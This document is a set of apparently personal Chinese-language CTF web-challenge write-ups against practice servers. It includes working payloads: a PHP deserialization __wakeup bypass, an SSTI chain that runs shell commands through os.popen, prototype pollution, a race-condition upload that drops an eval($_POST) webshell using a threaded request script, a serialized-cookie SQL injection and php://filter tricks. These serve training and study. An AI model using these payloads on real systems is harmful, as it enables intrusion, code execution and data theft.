payload：http://61.147.171.105:61728/?page=http://127.0.0.1/index.php/?hello=<?show_source('fl4gisisish3r3.php');?>

感觉挺有意思的一道题

先构造序列化对象，然后手动修改

O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $fl4g = new Demo('fl4g.php');
	$var = serialize($fl4g);
	echo $var."\n";

	$var = str_replace('O:4','O:+4',$var);	#用+4替换成4是为了绕过preg_match()的正则匹配
	echo $var."\n";
	$var = str_replace(':1:',':2:',$var);		#绕过__wakeup()魔术方法
	echo $var."\n";
	echo strlen($var)."\n";
	$var = base64_encode($var);	
	echo $var."\n"."\n";
	
	$input = 'O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}';
    echo $input."\n";
	echo strlen($input)."\n";
	$input = base64_encode($input);
	echo $input."\n";
 ?>

```

然后发现你手动输入的并不是真正的输入，会有两个字符长度的差距导致base64编码后的结果也不一样。（卡我了一年）

var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号$。
protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0\0的前缀。这里的\0表示 ASCII 码为0的字符，而不是\0组合。
  private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上\0\0的前缀。这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。
  字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中\0字符也是计算长度的。

  所以这里的private $file = ‘index.php’;中private在被序列化的时候给Demofile（类名属性名）中的类Demo前后分别加上一个了\0，导致Base64编码的值不同。
  如果这里的声明是public，被序列化后的属性名就只是file（属性名）。
  通过给赋值粘贴的字符串中的Demofile中的类Demo前后也分别加上一个了\0，可以验证上面的结论：

序列化结果为：
O:6:"class1":3:{s:1:"a";s:1:"1";s:4:"*b";s:5:"ThisB";s:9:"class1c";s:5:"ThisC";}
对象序列化后的结构为：
O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}
a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。
b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00*%00。所以，protected属性的表示方式是在变量名前加上%00*%00。
c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。
虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。

下次就记得了



大概就是一个模板注入、magic万岁！！

先打开界面发现告诉我们是模板注入（模板注入就是先写好一个html文件，然后传参即可实现传递（传递数据即可可视化））

这段代码中的 `html` 就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用 `render_template_string` 方法来调用这个模板，从而直接把这个样式渲染出来。 而模板注入，就是指 **将一串指令代替变量传入模板中让它执行** ，以这段代码为例，我们在传入 `code` 值时，可以用 `{{}}` 符号来包裹一系列代码，以此替代本应是参数的 `id` 

介绍一下魔术方法

```
_class__`：用于返回该对象所属的类，如某个字符串，他的对象为字符串对象，而其所属的类为`<class 'str'>
```

`__bases__`：以元组的形式返回一个类所直接继承的类。

`--base__`：以字符串返回一个类所直接继承的类

`__mro__`：返回解析方法调用的顺序

`__subclassws__()`：获取类的所有子类

`__init__`：所有自带类都包含init方法，便于利用他当跳板来调用globals

流程：

1. \1. 随意找一个内置类对象利用`__class__`拿到该对象所对应的类型
2. \2. 用`__bases__`或`__mro__`拿到基类`<class 'object'>`

```
''.__class__.__bases__[0].__subclasses__()
().__class__.__mro__[2].__subclasses__()
().__class__.__mro__[-1].__subclasses__()
request.__class__.__mro__[1]
```

1. \1. 用`__subclasses__（）`获取所有子类
2. \2. 在子类中寻找可以合适的继承链执行命令或读取文件

在Python中，所有的类都继承自 `object` 类。`object` 是Python中的基类，也被称为根类。它是所有类的顶级父类，包括用户自定义的类和内置的类。

```php
先通过http://61.147.171.105:63458/{{''.__class__.__mro__[2]}}获取其基类object
再找其内置的子类
   http://61.147.171.105:63458/{{''.__class__.__mro__[2].__subclasses__()}}
然后找到71 site._Printer
通过 `__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()` 来执行命令即可到手
```



来到注册界面发现需要输入那个invite code 原本想爆破（也可能有点慢），后来发现可以抓包修改判定

抓到的包如下

```php
POST /register HTTP/1.1
Host: 61.147.171.105:51369
Content-Length: 56
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://61.147.171.105:51369
Referer: http://61.147.171.105:51369/register.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"username":"admin","password":"123456","isAdmin":false}
```

然后了解到JavaScript的原型链污染

大概就是如下

```javascript
var a = {number : 520}
var b = {number : 1314}
b.__proto__.number=520 
var c= {}
c.number
```

我们这里调用`b.number`时，它的具体调用过程是如下所示的

```javascript
1、在b对象中寻找number属性
2、当在b对象中没有找到时，它会在b.__proto__中寻找number属性
3、如果仍未找到，此时会去b.__proto__.__proto__中寻找number属性
```

复制

也就是说，它从自身开始寻找，然后一层一层向上递归寻找，直到找到或是递归到`null`为止，此机制被称为`JavaScript继承链`，我们这里的污染的属性是在`b.__proto__`中，而我们的`b`对象本身就有`number`，所以其值并未改变。

> ​         二、为什么新建的值为空的c对象，调用`c.number`竟然有值而且为我们设定的520

当明白上个问题时，这个问题也就迎刃而解了，我们这里的`c`对象虽然是空的，但`JavaScript继承链`的机制就会使它继续递归寻找，此时也就来到了`c.__proto__`中寻找`number`属性，我们刚刚进行了原型链污染，它的`c.__proto__`其实就是`Object.protoype`，而我们进行污染的`b.__proto__`也是`Object.prototype`，所以此时它调用的`number`就是我们刚刚污染的属性，所以这也就是为什么`c .number=520`

大概就是条件竞争上传，诱发原因是先上传再删除。

条件竞争原理：我们成功上传了php文件，服务端会在短时间内将其删除，我们需要抢到在它删除之前访问文件并生成一句话木马文件，所以访问包的线程需要稍微大于上传包的线程。

然后用bp发包（设置一个线程）

```php
POST /upload.php HTTP/1.1
Host: 61.147.171.105:49644
Content-Length: 275
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:49644
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQyWgb3oDSJcxO1ze
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://61.147.171.105:49644/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1693809419; last_login_info=YToyOntzOjI6ImlwIjtzOjE0OiIxMjMuMTIzLjEyMy4yMyI7czozOiJzcWwiO086MzoiU1FMIjozOntzOjU6InRhYmxlIjtzOjU6InVzZXJzIjtzOjg6InVzZXJuYW1lIjtzOjEyOiJhZG1pbicgb3IgJzEiO3M6ODoicGFzc3dvcmQiO3M6MToiMSI7fX0=
Connection: close

------WebKitFormBoundaryQyWgb3oDSJcxO1ze
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: application/octet-stream

<?php 
fputs(fopen("heihei.php", "w"), '<?php @eval($_POST["heihei"]); ?>'); 
?>
------WebKitFormBoundaryQyWgb3oDSJcxO1ze--

```

再用python访问这个地点

```python
import requests
import threading
import os


class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

        self.url = 'http://61.147.171.105:49644/upload/2.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print(r.text)
            os._exit(0)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._get()


if __name__ == '__main__':
    threads = 1000

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```

然后即可赶在删除前逮捕他获取flag

主要是对xff和refer的伪造

X-Forwarded-For (XFF) 是一个 HTTP 请求标头，用于识别客户端的原始 IP 地址。当请求通过代理服务器或负载均衡器时，原始客户端的 IP 地址会被替换为代理服务器的 IP 地址。通过 XFF 标头，可以获取到客户端的真实 IP 地址，尤其在多层代理的情况下。

Referer（有时写作 "Referrer"）是一个 HTTP 请求标头，用于指示请求的来源页面。当用户通过点击链接或提交表单等方式访问某个页面时，浏览器会在发送请求时附带 Referer 标头，其中包含了来源页面的 URL 信息。这对于网站分析和跟踪用户来源非常有用。

需要注意的是，XFF 和 Referer 标头都可以被修改或伪造，因此在进行安全相关的操作时，不能完全依赖于它们的值。

伪造后的数据包：

GET / HTTP/1.1
Host: 61.147.171.105:50549
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 123.123.123.123
Referer:https://www.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

~~在给我点时间，一定能做出来~~

先用dirsearch扫一下发现有一个.DS_Store文件

.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。

**通过.DS_Store可以知道这个目录里面所有文件的清单。**

.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (https://github.com/gehaxelt/Python-dsstore) 来完成 .DS_Store 文件的解析，直观一些

后来发现目录下有flag文件

凑md5特定后缀的如下(还挺快--意料之外)

```python
import hashlib

target_suffix = "04b02f"

# 循环生成字符串并计算哈希值
i = 0
while True:
    # 构造字符串
    string = str(i)
    # 计算哈希值
    hash_value = hashlib.md5(string.encode()).hexdigest()
    # 提取哈希值的后六位
    suffix = hash_value[-6:]
    # 检查是否符合条件
    if suffix == target_suffix:
        break
    i += 1

print("生成的字符串:", string)
print("对应的哈希值:", hash_value)
```

然后用url编码和file协议即可获取flag

file:///%66%6c%61%67

感觉还是有点困，然后就没怎么想

先代码审计

conn.php

```php
public function waf(){
    	$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"]; 
public function __wakeup(){
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        if($this->table){
            $this->waf();
        }
        $this->check_login();
        $this->conn->close();
    }
```

这里发现__wakeup的时候执行了一套mysql的语句（考虑可能sql注入）标准的输入时会过滤好多

于是在cookie注入

index.php

```php
if (isset ($_COOKIE['last_login_info'])) {
    $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));
    try {
        if (is_array($last_login_info) && $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('WAF info: your ip status has been changed, you are dangrous.');
        }
    } catch(Exception $e) {
        die('Error');
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('last_login_info', $cookie, time () + (86400 * 30));
}

```

这里进行了一套反序列化，注意反序列化的时候会自动执行一遍__wakeup

```php
<?php

class SQL {
    public $table = 'users';
    public $username = "admin' or '1";
    public $password = '1';
 }

var_dump(base64_encode (serialize(array( 
     'ip' => '123.123.123.23',
     'sql' => new SQL(),
     ))));
```

这样注入就可以了（可以绕过过滤直接获取）

感觉答来答去还是这些题目（这个4分的题目和那个1分的题目有什么区别)

直接用php://filter中的convert.iconv来爆破转化

payload如下：

http://61.147.171.105:57078/?filename=php://filter/convert.iconv.UTF-7.UCS-4*/resource=flag.php

把所有php支持的字符放进bp里面去爆破就可以了

这里补充几个知识点

使用`（别名：.*）`作为正则表达式模式将匹配整个文本，而不仅仅是第一个别名。这是因为`.*`会尽可能多地匹配字符，直到遇到最后一个别名。

为了避免贪婪匹配，我们使用非贪婪量词`?`，即`.*?`。它告诉正则表达式引擎尽可能少地匹配字符。在我们的示例中，它将匹配到第一个别名的结束括号之前，从而确保我们只匹配到一个别名。

感觉正则表达式学的不太好（xs）

然后放bp里面爆破就行了，可以先单爆破（比较快）

